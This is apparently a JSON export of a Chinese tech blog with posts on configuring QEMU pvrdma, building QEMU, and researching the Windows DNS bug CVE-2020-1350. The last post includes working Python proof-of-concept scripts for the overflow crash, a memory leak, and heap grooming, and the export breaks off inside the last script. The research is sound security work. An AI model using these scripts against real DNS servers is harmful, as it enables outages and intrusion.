{"meta":{"title":"VictorV的小博客","subtitle":"","description":"记录一些懒得找的东西, 和一些想写的东西","author":"VictorV","url":"http://474172261.github.io","root":"/"},"pages":[],"posts":[{"title":"如何给qemu编译配置pvrdma设备","slug":"configure-pvrdma-for-qemu","date":"2021-05-25T06:35:07.527Z","updated":"2021-05-25T08:08:13.744Z","comments":true,"path":"2021/05/25/configure-pvrdma-for-qemu/","link":"","permalink":"http://474172261.github.io/2021/05/25/configure-pvrdma-for-qemu/","excerpt":"缘起于我在审计源码时找到pvrdma的一个bug, 因此需要构建一个pvrdma设备来测试, 但是呢, 因为rdma硬件设备很贵, 所以测试只能用模拟的rdma设备, 这里面, 主要使用的是soft-RoCE类型的模拟设备. 本身这件事不算困难, 奈何网上的资料太少了, 导致我在这方面栽了不少跟头, 分享出来, 希望能够帮助到大家.","text":"缘起于我在审计源码时找到pvrdma的一个bug, 因此需要构建一个pvrdma设备来测试, 但是呢, 因为rdma硬件设备很贵, 所以测试只能用模拟的rdma设备, 这里面, 主要使用的是soft-RoCE类型的模拟设备. 本身这件事不算困难, 奈何网上的资料太少了, 导致我在这方面栽了不少跟头, 分享出来, 希望能够帮助到大家. 准备rdma相关驱动最简单的方法, 使用centos7或者centos8, 执行lsmod |grep rdma, 如果存在rdma_rxe结果, 说明系统已经有了rdma相关驱动. 可以直接跳过这个准备步骤. 另一种方法, 编译一个新内核, 再编译用户态模块. 坑爹之路就此开始. 以下以ubuntu 16.04为例, 按照soft-RoCE的wiki指示开始编译内核. 下载此项目的v18分支. (按我的理解, 直接下载其它kernel源码来编译也是ok的, 没必要非得用这个, 我没有测试, 就不清楚行不行了) 准备相关编译组件 123456sudo apt-get install gitsudo apt-get install libncurses5-devsudo apt-get install libssl-devsudo apt-get install libibcm1 libibcm-dev ibverbs-utils libibverbs-dev sudo apt-get install libibverbs1 librdmacm-dev librdmacm1 rdmacm-utils sudo apt-get install libswitch-perl 进入项目, 开始配置编译选项 12cp /boot/config-`uname -r` .configmake menuconfig 弹出一个配置界面, 输入/, 并键入RXE, 会得到如下结果: 按1, 跳转到改选项, 按M启用改模块, 之后回到这个配置的主界面保存配置, 再退出 开始编译并安装 1234sudo make -j 4 # 此处的4是cpu的个数, 不要超过它, 不然编译可能更慢sudo make modules_installsudo make installsudo make headers_install INSTALL_HDR_PATH=/usr 重启并使用新编译的内核 下载用户态项目文件, 解压后进入目录 编译并配置 12345678./configure --libdir=/usr/lib64/ --prefix=makemake installsudo ln -s /usr/lib64/librxe.a /usr/lib/librxe.asudo ln -s /usr/lib64/librxe.la /usr/lib/librxe.lasudo ln -s /usr/lib64/librxe-rdmav2.so /usr/lib/librxe-rdmav2.sosudo ln -s /usr/lib64/librxe.so /usr/lib/librxe.so 使用下列命令查看状态, 可能是如下效果 123$ rxe_cfg status Name Link Driver Speed NMTU IPv4_addr RDEV RMTU ens160 yes vmxnet3 10GigE 1500 192.168.170.129 执行下列命令添加网卡并查看状态 123456789101112131415161718192021222324$ rxe_cfg add ens160$ rxe_cfg start$ ibv_devices device node GUID ------ ---------------- rxe0 020c29fffeee3b66$ ibv_devinfohca_id: rxe0 transport: InfiniBand (0) fw_ver: 0.0.0 node_guid: 020c:29ff:feee:3b66 sys_image_guid: 0000:0000:0000:0000 vendor_id: 0x0000 vendor_part_id: 0 hw_ver: 0x0 phys_port_cnt: 1 port: 1 state: PORT_ACTIVE (4) max_mtu: 4096 (5) active_mtu: 1024 (3) sm_lid: 0 port_lid: 0 port_lmc: 0x00 link_layer: Ethernet 测试网络状态 12$ ibv_rc_pingpong -d rxe0 -g 1local address: LID 0x0000, QPN 0x000011, PSN 0x29338a, GID fe80::12cb:883b:5ccf:e656 另外开启一个bash, 执行ibv_rc_pingpong -d rxe0 -g 1 127.0.0.1 这时候server端会多出一行输出: 1remote address: LID 0x0000, QPN 0x000012, PSN 0xe63ffc, GID fe80::12cb:883b:5ccf:e656 client端会得到如下输出: 12local address: LID 0x0000, QPN 0x000012, PSN 0xe63ffc, GID fe80::12cb:883b:5ccf:e656 remote address: LID 0x0000, QPN 0x000011, PSN 0x29338a, GID fe80::12cb:883b:5ccf:e656 配置qemu编译选项 修改qemu项目中如下文件contrib/rdmacm-mux/meson.build 123456789 executable(&#39;rdmacm-mux&#39;, files(&#39;main.c&#39;), dependencies: [glib, libumad], build_by_default: true, install: false)改为 executable(&#39;rdmacm-mux&#39;, files(&#39;main.c&#39;), dependencies: [glib, libumad], build_by_default: true, install: true) 执行如下编译配置 1$ ./configure --enable-rdma --enable-pvrdma --enable-kvm --enable-debug --target-list=x86_64-softmmu 接下来就是make和make install了. 具体参考上一篇关于qemu编译的blog. 编译过程中可能遇到的问题 出现如下提示: 12345&quot; OpenFabrics librdmacm&#x2F;libibverbs&#x2F;libibumad not present.&quot; \\&quot; Your options:&quot; \\&quot; (1) Fast: Install infiniband packages (devel) from your distro.&quot; \\&quot; (2) Cleanest: Install libraries from www.openfabrics.org&quot; \\&quot; (3) Also: Install softiwarp if you don&#39;t have RDMA hardware&quot; 查看项目build/config.log文件, 查看出错原因. 我的主要错误是: 1if has error:config-temp&#x2F;qemu-conf.c:1:27: fatal error: rdma&#x2F;rdma_cma.h: No such file or directory 通过执行find / -name &quot;rdma_cma.h对整个硬盘搜索rdma_cma.h文件, 发现没找到, 就去网上找了它所在的librdmacm库, 下载解压后, 使用./autogen.sh &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install安装即可. ERROR: Could not detect Ninja v1.7 or newer 这个应该是本机安装的ninja组件, 或者版本过低, 可以通过如下命令下载安装解决 123456$ wget https://github.com/ninja-build/ninja/releases/download/v1.8.2/ninja-linux.zip$ sudo unzip ninja-linux.zip -d /usr/local/bin/$ sudo update-alternatives --install /usr/bin/ninja ninja /usr/local/bin/ninja 1 --force输出:update-alternatives: using /usr/local/bin/ninja to provide /usr/bin/ninja (ninja) in auto mode$ /usr/bin/ninja --version1.8.2 ../hw/block/virtio-blk.c:30:22: fatal error: scsi/sg.h: No such file or directory compilation terminated. 12345678910111213141516$ wget http://launchpadlibrarian.net/353523714/libc6-dev_2.23-0ubuntu10_amd64.deb$ dpkg -i libc6-dev_2.23-0ubuntu10_amd64.deb(Reading database ... 184747 files and directories currently installed.)Preparing to unpack libc6-dev_2.23-0ubuntu10_amd64.deb ...Unpacking libc6-dev:amd64 (2.23-0ubuntu10) over (2.23-0ubuntu3) ...dpkg: dependency problems prevent configuration of libc6-dev:amd64: libc6-dev:amd64 depends on libc6 (= 2.23-0ubuntu10); however: Version of libc6:amd64 on system is 2.23-0ubuntu3. libc6-dev:amd64 depends on libc-dev-bin (= 2.23-0ubuntu10); however: Version of libc-dev-bin on system is 2.23-0ubuntu3.dpkg: error processing package libc6-dev:amd64 (--install): dependency problems - leaving unconfiguredErrors were encountered while processing: libc6-dev:amd64$ apt -f install 启动参数 参照官方指导文档, 需要保证ib_cm模块没有加载, 因此先卸载相关模块. 并且加载必要模块 12$ rmmod rdma_ucm rdma_cm ib_cm$ insmod ib_umad 注意, 默认情况下, rdmacm-mux文件的输出是调用的syslog, 建议改成printf 并把umad_open_port的返回结果输出出来, 以便找到失败原因. 在执行上述操作前, 请确保已经执行过了rxe_cfg start操作. 执行下列命令, 创建所需socket 12345$ qemu-6.0.0/build/contrib/rdmacm-mux/rdmacm-mux -d rxe0unix_socket_path=/var/run/rdmacm-mux-rxe0-1 这行是改成printf后会输出的内容.rdma-device-name=rxe0 这行是改成printf后会输出的内容.rdma-device-port=1 这行是改成printf后会输出的内容.Service started 创建桥接网络 1234567$ apt-get install uml-utilities$ tunctl -t tap0 -u `whoami`$ chmod 0666 /dev/net/tun 让所有用户可读$ ifconfig tap0 192.168.2.1 up 给tap0设置ip段添加防火墙规则$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward$ iptables -t nat -A POSTROUTING -j MASQUERADE 参考网址 最后, qemu启动参数 12345$ /usr/local/bin/qemu-system-x86_64 -object memory-backend-ram,id=mb1,size=1G,share=on -numa node,memdev=mb1 \\-netdev tap,id=mynet0,ifname=tap0,script=no,downscript=no \\-device vmxnet3,netdev=mynet0,id=net0,mac=52:54:00:e3:00:81,addr=0x10.0,multifunction=on \\-chardev socket,path=/var/run/rdmacm-mux-rxe0-1,id=mads -device pvrdma,addr=0x10.1,ibdev=rxe0,netdev=net0,mad-chardev=mads \\-m 1G -hda qemu-6.0.0/centos7.img --enable-kvm 安装官方文档描述, pvrdma必须要三个参数: ibdev, netdev, mad-chardev. 而且必须在slot1是一个vmxnet3网卡, 所以vmxnet3的pci地址是 0x10.0, 而pvrdma是0x10.1 libvirt配置如果不想直接用命令启动qemu, 用libvirt也可 假如已经存在一个格式为qcow2的虚拟机image文件了, 假设文件名为centos7.img 123456789101112131415161718192021安装相关组件$ apt install libvirt libvirt-python libguestfs-tools virt-install启动相关服务$ systemctl enable libvirtd$ systemctl start libvirtd查看桥接网卡$ brctl showbridge name bridge id STP enabled interfacesvirbr0 8000.525400455887 yes virbr0-nic添加现成虚拟机$ virt-install --import --name vm1 \\--memory 1024 --vcpus 1 --cpu host \\--disk centos7.img,format=qcow2,bus=virtio \\--network bridge=virbr0,model=virtio \\--os-type=linux \\--os-variant=centos7.0 \\--nographics \\--noautoconsole 安装后, 先关闭虚拟机, 然后在/etc/libvirt/qemu/目录下找到vm1.xml文件 12345678910111213141516171819202122&lt;domain type='kvm'&gt; &lt;name&gt;vm2&lt;/name&gt; &lt;devices&gt; &lt;interface type='bridge'&gt; &lt;mac address='56:b4:44:e9:62:dc'/&gt; &lt;source bridge='virbr0'/&gt; &lt;model type='vmxnet3'/&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x10' function='0x0' multifunction='on'/&gt; &lt;/interface&gt; &lt;/devices&gt; &lt;qemu:commandline&gt; &lt;qemu:arg value='-object'/&gt; &lt;qemu:arg value='memory-backend-ram,id=mb1,size=1G,share'/&gt; &lt;qemu:arg value='-numa'/&gt; &lt;qemu:arg value='node,memdev=mb1'/&gt; &lt;qemu:arg value='-chardev'/&gt; &lt;qemu:arg value='socket,path=/var/run/rdmacm-mux-rxe0-1,id=mads'/&gt; &lt;qemu:arg value='-device'/&gt; &lt;qemu:arg value='pvrdma,addr=10.1,ibdev=rxe0,netdev=bridge0,mad-chardev=mads'/&gt; 注意这里是10.1 必须和vmxnet3的bus='0x00' slot='0x10' function='0x0' 对应, 保证bus相同, slot相同, 但是function, 0为vmxnet3, 1为pvrdma. &lt;/qemu:commandline&gt;&lt;/domain&gt; 此处的bridge0是哪一个我不是很确定, 需要的人得自己琢磨一下了. 我配置这里主要是为了获取vmxnet3的真实启动配置参数. 常见的virsh命令: 列出所有虚拟机virsh list --all 获取虚拟机信息virsh dominfo vm1 关闭虚拟机virsh shutdown vm1 启动虚拟机virsh start vm1 虚拟机随宿主机启动而自动启动virsh autostart vm1 安全重启虚拟机virsh reboot vm1 重启虚拟机(不安全，hard reset)virsh reset vm1 删除虚拟机virsh shutdown vm1virsh undefine vm1virsh pool-destroy vm1 结语一开始并不知道centos可以省去那么多麻烦, 在ubuntu上卡了很久很久, 也没人能帮到我, 最后总算是靠着一行行看配置文件找到失败原因, 并一一解决, 这里更不提那个softiWarp了, 这里虽然没用到, 但是那个错误提示里提到后, 我就以为需要配置它, 也踩了不少的坑 T-T. 在rdmacm-mux的编译和启动那一步也卡了很久, 不明白为什么启动不了server, 后来明白是自己给的设备名字不对, 并不是一个任意名字, 必须是设备名. 启动参数那也费了很多力气, 官方文档是用libvirt, 由于缺乏相关使用经验, 就先自己琢磨的参数, 后来实在有问题, 就用libvirt创建了虚拟机, 并修改了相关文件的配置, 添加成功命令, 并一步步找失败原因. 他们文档说是要让vmxnet3在slot 0, 但是并没有说怎么放到slot 0, 中间还遇到PCI: single function device can&#39;t be populated in function 10.1错误, 后来发现是vmxnet3缺少multifunction参数所致. qemu官方文档真的太坑了, 信息给的少, 网上也缺乏相关资料, 只能自己琢磨, 唉, 坑啊~","categories":[],"tags":[]},{"title":"qemu编译简单指南","slug":"qemu-build","date":"2021-05-14T02:43:55.720Z","updated":"2021-05-14T02:58:18.394Z","comments":true,"path":"2021/05/14/qemu-build/","link":"","permalink":"http://474172261.github.io/2021/05/14/qemu-build/","excerpt":"","text":"经常编译qemu, 又忘了一些依赖库的安装, 添加到blog, 方便取用 :) qemu编译 登录http://download.qemu-project.org/?C=M;O=D网站直接下载源码包（例如文件名为qemu-2.8.0.tar.bz2） 解压文件$ tar –jxvf qemu-2.8.0.tar.bz2 安装 依赖库Ubuntu系统 12345$ sudo apt-get install -y zlib1g-dev $ sudo apt-get install -y libglib2.0-dev $ sudo apt-get install -y autoconf2.13 $ sudo apt-get install -y libtool $ sudo apt-get install -y libgtk2.0-dev Centos系统 123456$ yum install zlib-devel.x86_64 -y $ yum install gtk2-devel –y $ yum install autoconf $ yum install gettext $ yum install flex $ yum install bison 编译安装 1234$ cd qemu-2.8.0 $ ./configure --enable-kvm --enable-debug --target-list=x86_64-softmmu $ make -j 4 注意, 此处的4与虚拟机或者物理机的逻辑处理器个数一样. 可以更小,不能超过.$ sudo make install kvmUbuntu系统 $ sudo apt install qemu-kvm其它Linux系统 $ yum install qemu-kvm.x86_64注意查看cat /proc/cpuinfo |grep -E &quot;vmx|svm&quot; 是否有结果, 如果没有, 记得启动vmware的cpu的虚拟化intel VT-x选项. 创建虚拟机假设创建一个虚拟机硬盘为10G:qemu-img create -f qcow2 centos.img 10G 通过iso创建安装系统$ qemu-system-x86_64 -m 256 -hda centos.img -cdrom winxpsp2.iso -enable-kvm 如果默认没有虚拟机界面, 可以安装vncviewer查看 12$ sudo apt-get install vncviewer $ vncviewer localhost:5900","categories":[],"tags":[]},{"title":"Windows DNS server从cve-2020-1350到内存泄露","slug":"dns-overflow-and-memLeak","date":"2020-09-26T00:10:53.132Z","updated":"2020-10-18T08:07:53.571Z","comments":true,"path":"2020/09/26/dns-overflow-and-memLeak/","link":"","permalink":"http://474172261.github.io/2020/09/26/dns-overflow-and-memLeak/","excerpt":"7月14的公布了dns的一个远程rce的补丁, 与此同时, 发现者也发布了一篇相关的利用文章(虽然他们并没有完成利用:) ) 我也研究了下这个漏洞, 从复现poc到探究利用可能性, 花了几天时间, 然后发现了一个内存泄露. 一开始没有及时报, 没想到还是被别人撞了T-T. 原发现者的文章描述的已经足够详细, 本文将简短描述下从它的文章开始, 实现poc构造. 另外分享一下同时存在的内存泄露bug, 以及一些可能的利用思路.(拖延症患者, 内容比较随意, 主要是分享一些思路和想法, 所以比较随意….)","text":"7月14的公布了dns的一个远程rce的补丁, 与此同时, 发现者也发布了一篇相关的利用文章(虽然他们并没有完成利用:) ) 我也研究了下这个漏洞, 从复现poc到探究利用可能性, 花了几天时间, 然后发现了一个内存泄露. 一开始没有及时报, 没想到还是被别人撞了T-T. 原发现者的文章描述的已经足够详细, 本文将简短描述下从它的文章开始, 实现poc构造. 另外分享一下同时存在的内存泄露bug, 以及一些可能的利用思路.(拖延症患者, 内容比较随意, 主要是分享一些思路和想法, 所以比较随意….) CVE-2020-1350漏洞成因溢出点在行19, 其中rest_size最大值可以是0xffff-29-namelen(举例, 对于网址v-v.space, 其namelen 为”\\x03v-v\\x05space\\x00”的长度, 即11). 函数Name_PacketNameToCountNameEx读取的最大长度为0xff, 而RR_AllocateEx接受的第一个参数类型是u16类型, 从而在特殊情况下导致了整数溢出. poc构造思路虽然知道需要一个ns中转记录, 但是不太会配置dns服务器, 花了一天才弄明白中转的设置. 服务器管理器-&gt;工具-&gt;选择DNS-&gt;打开DNS管理器 打开转发器配置界面，配置伪DNS服务器IP地址此处的ip就是我们需要发送poc的伪服务器地址. 通过发现者发表的文章SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers中的这个图片 可以知道, 触发路径是Tcp_Receiver -&gt; Answer_ProcessMessage -&gt; Recurse_ProcessResponse -&gt; Recurse_CacheMessageResourceRecords -&gt; Wire_CreateRecordFromWire -&gt; SigWireRead. 通过文章内容我们知道, 大意就是让这个dns server 向另一个dns server(记作X)发起请求, 然后 X 回了一个要求用tcp请求连接的回执(因为默认dns查询用的udp), 然后dns server 再次用tcp 向 X 发起请求, X 回了一个包, 就能走到这个路径. 那么首先需要构造一个强制要求tcp的回执, 这里我直接dump了wireshark的一个正常查询v-v.space的回执包, 然后设置回执flag为tcp: 123456789101112131415161718192021222324252627282930313233resp = \"\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73\" \\\"\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a\" \\\"\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69\" \\\"\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00\" \\\"\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68\"def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind(('0.0.0.0', 53)) while True: data, addr = s.recvfrom(2048) print \"received:\", data.encode('hex'), \"from\", addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 # 设置flags ba[7] = 1 # 设置PR为1个 data = bytes(ba) l = s.sendto(data, addr) print \"sent\", hex(l), hex(len(data)) print '-++++++++++++++++++++++\\n' s.close() print 'close udp' def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind(('0.0.0.0',53)) server.listen(5) while True: conn,addr = server.accept() print addr data = conn.recv(1024) ... conn.send(new_data) 之后, 向目标发起9999.v-v.space的dns请求: 12345678import dns.message, dns.queryimport threaddef doer(): m = dns.message.from_wire(\"\\xce\\x2e\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"+\"\\x049999\"+\"\\x03\"+\"v-v\"+\"\\x05\"+\"space\"+\"\\x00\\x00\\x01\\x00\\x01\") # mr = dns.query.udp(m, '192.168.170.134') # here is the target dns server.doer() 得到如下交互流程: 从交互流程可以看到, 我向192.168.170.134请求了一个dns, 它将请求转到192.168.170.1的dns服务器, 服务器回执了一个带truncated的flag的答复, 然后134用tcp连接到192.168.170.1, 重新发起请求. 这时候我可以回任意的回执. 接下来在函数Recurse_CacheMessageResourceRecords内下断点, 可以看到它a1+0xE06开始, 是我给回执. 至于为什么是+0xe06位置, 可以在函数Tcp_Receiver -&gt; Tcp_ReceiveMessage的recv调用找到. 接下来就是枯燥的逆向Recurse_CacheMessageResourceRecords函数的流程. 此处我不会再讲怎么逆向, 只说一下大致的执行流程. dns有4个类型的请求, questions, answer, authority, additional. 函数按顺序从dns头获取该类型的个数, 然后执行相应的处理. 当处理到answer类型, 且type为46或者24时, 就能进入到Wire_CreateRecordFromWire函数. 所以完整type46的poc如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structresp = \"\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73\" \\\"\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a\" \\\"\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69\" \\\"\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00\" \\\"\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68\"def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind(('0.0.0.0',53)) server.listen(5) while True: conn,addr = server.accept() print(conn,addr) while True: data = conn.recv(1024) if not data: continue # print 'recive:',data.encode('hex') ba = bytearray() poison = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff\\xcc'+'a'*18+'\\xc0\\x0d'+'\\x00'*0xffff data = data[:18+getNameLen(data)]+poison ba.extend(map(ord, data[:0xffff+2])) ba[0] = struct.pack('&gt;H', 0xffff)[0] ba[1] = struct.pack('&gt;H', 0xffff)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = 0 ba[9] = 1 # other prs ba[10] = 0 ba[11] = 0 ba[12] = 0 ba[13] = 0 data = bytes(ba) l = conn.send(data) print 'sent',hex(l), hex(len(data)) print '---------------------------\\n' conn.close() break print 'tcp recv exit'def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind(('0.0.0.0', 53)) while True: data, addr = s.recvfrom(2048) print \"received:\", data.encode('hex'), \"from\", addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print \"sent\", hex(l), hex(len(data)) print '-++++++++++++++++++++++\\n' s.close() print 'close udp'import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input('&gt;') type 24的可以参见CVE-2020-1350 (SIGRed) - Windows DNS DoS Exploit 内存泄露内存泄露就很简单了, 在函数Recurse_CacheMessageResourceRecords的循环处理函数Wire_CreateRecordFromWire返回值的时候, 如果在处理下一个answer时中途出现错误, 会直接跳出循环. 虽然它保存了所有的内存指针, 但是并没有调用free操作把所有指针释放掉, 导致最后内存指针丢失, 造成内存泄露. 最后微软给的cve是 CVE-2020-1228 . 以下是内存泄露的poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structimport timeresp = \"\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73\" \\\"\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a\" \\\"\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69\" \\\"\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00\" \\\"\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68\"def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def get_alloc_max_spray(n, n_answer): if n &gt; 0x7f7: raise \"number is too big\" p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\xe0'+'\\xaa'*18+'\\xc0\\x0d'+'a'*7+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x15'+'a'*0x15+'\\x00' p1 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x14'+'\\x00'*18+'\\xc0\\x0d' n_answer[0] = n+1 return p0+p1*(n-1)def get_alloc_max_and_free(n, n_answer): n_answer[0] = (n+0x100)/8 if n &gt; 0x10047: raise \"number is too large\" size = 0xff&amp;(n-0x48-0x3b) p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff'+chr(size)+'a'*18+'\\xc0\\x0d' # size = 0xffc4+0x3b = 0xffff return p0def tcp_handler(): server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind(('0.0.0.0',53)) server.listen(5) # totalSize = 0 # size = totalSize-0x48-0 n_answer = [0, 0] funcs = [ get_alloc_max_spray ] steps = [ (0x2ab0*4, funcs[0], 3), ] step = 0 step_i = 0 while True: conn,addr = server.accept() print addr while True: data = conn.recv(1024) if not data: continue print 'step:',step,'step_i', step_i ba = bytearray() data = data[:18+getNameLen(data)]+steps[step][1](steps[step][2], n_answer) ba.extend(map(ord, data)) ba[0] = struct.pack('&gt;H', len(data)-2)[0] ba[1] = struct.pack('&gt;H', len(data)-2)[1] # flags ba[4] = 0x84 ba[5] = 0 # answer PRs ba[8] = n_answer[0]&gt;&gt;8 ba[9] = n_answer[0]&amp;0xff # other prs ba[10] = n_answer[1]&gt;&gt;8 ba[11] = n_answer[1]&amp;0xff ba[12] = 0 ba[13] = 0 data = bytes(ba) if step == 4: thread.start_new_thread(sendAQuery,()) time.sleep(0.001) l = conn.send(data) print 'sent',hex(l), hex(len(data)) print '---------------------------\\n' conn.close() step_i += 1 if steps[step][0] == step_i: step += 1 step_i = 0 break print 'tcp recv exit'def udp_handler(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind(('0.0.0.0', 53)) while True: data, addr = s.recvfrom(2048) print \"received:\", data.encode('hex'), \"from\", addr ba = bytearray() ba.extend(map(ord, data+resp)) ba[2] = 0x86 ba[7] = 1 data = bytes(ba) l = s.sendto(data, addr) print \"sent\", hex(l), hex(len(data)) print '-++++++++++++++++++++++\\n' s.close() print 'close udp'import threadthread.start_new_thread(udp_handler,())thread.start_new_thread(tcp_handler,())raw_input('&gt;') cve-2020-1350的利用思路分析通过分析它的堆分配函数Mem_Alloc可以知道, 当请求的size超过0xa0时会分配传统heap, 否则从它自定义的大堆内选一个被切出来的小块作为结果返回. 而在函数Recurse_CacheMessageResourceRecords内, 它把函数Wire_CreateRecordFromWire返回的heap通过单项链表串联了起来, +0位置指示了下一个结构体的指针. 利用内存泄露bug, 就可以实现完美的内存布局. 而dns内部, 某些size对应的堆并没有被激活lfh, 所以可以和普通的大堆挨在一起. tcp主结构体溢出思路 申请非常多0x10000这种大内存, 耗尽空隙 利用records申请一个0x10000+0x100的内存, 再申请个0x10000的内存(记作T), 那么这两个内存就会挨着. 在处理结束后, 就会留下一个0x100120的洞 申请一个0x10000的内存, 就会切下一个0x110的洞 申请一个tcp的query请求, 再申请一个0x100的内存来溢出, 由于它内部一些机制, 最后会把当前tcp的大块0x101f4申请到 T内存 之后, 从而可以溢出到tcp的主结构体 我最后并没有在windows server 2019上找到合适的泄露信息组件, 导致没办法完成利用. 精力有限, 便没有继续深入分析. 希望有兴趣的人可以基于此作更长远的利用. 下面是一个溢出的示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205# -*- coding: UTF-8import socketfrom impacket.structure import Structureimport dns.message, dns.queryimport threadingimport structimport timeresp = \"\\xc0\\x0c\\x00\\x06\\x00\\x01\\x00\\x00\\x02\\x58\\x00\\x3f\\x05\\x64\\x6e\\x73\" \\\"\\x32\\x35\\x07\\x68\\x69\\x63\\x68\\x69\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x0a\" \\\"\\x68\\x6f\\x73\\x74\\x6d\\x61\\x73\\x74\\x65\\x72\\x07\\x68\\x69\\x63\\x68\\x69\" \\\"\\x6e\\x61\\x03\\x63\\x6f\\x6d\\x00\\x78\\x67\\x41\\xf1\\x00\\x00\\x0e\\x10\\x00\" \\\"\\x00\\x04\\xb0\\x00\\x01\\x51\\x80\\x00\\x00\\x01\\x68\"def sendAQuery(): m = dns.message.from_wire(\"\\xcc\\x2e\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"+\"\\x049999\"+\"\\x03\"+\"v-v\"+\"\\x05\"+\"space\"+\"\\x00\\x00\\x01\\x00\\x01\") mr = dns.query.tcp(m, '192.168.170.140') print \"send query\"def getNameLen(data): s = 0 o = 14 l=ord(data[o:o+1]) while l: s += l+1 print l o += 1+l l = ord(data[o:o+1]) return s+1def get_alloc_1_c0h_and_ow_c0h(n, n_answer): p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\x00\\x2d'+'a'*18+'\\xc0\\x0d'+'a'*7+'\\x10'+'\\x39'+'a'*0xf+'\\x00' # len 79h p1 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x5c\\xf5\\x00\\xec'+'\\xff\\x7a'+'a'*18+'\\xc0\\x0e'+'a'*9+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x15'+'a'*0x15+'\\x00' # 87h n_answer[0] = 2 return p0+p1+'\\xcc'*0xff00def get_alloc_ow_size(size, n_answer): n_answer[0] = size/8-2 if size &gt; (0xd1+0x48): raise 'size is too big' n = 0xff &amp; ((0x10000|(size-0x48))-0xff) p0 = '\\xc0\\x0c\\x00\\x2e\\x00\\x01\\x00\\x00\\x00\\xec'+'\\xff'+chr(n)+'\\xaa'*18+'\\xc0\\x0d'+'a'*7+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x39'+'a'*0x39+'\\x15'+'a'*0x15+'\\x00' fake_header = '\\xcc'*16+'\\x00\\x00\\x00\\x00\\xbb\\x22\\xa3\\x00\\xef\\x0b\\x0b\\xfe\\xef\\x0b\\x0b\\xfe'+'a'*(size-0x10) padsize = 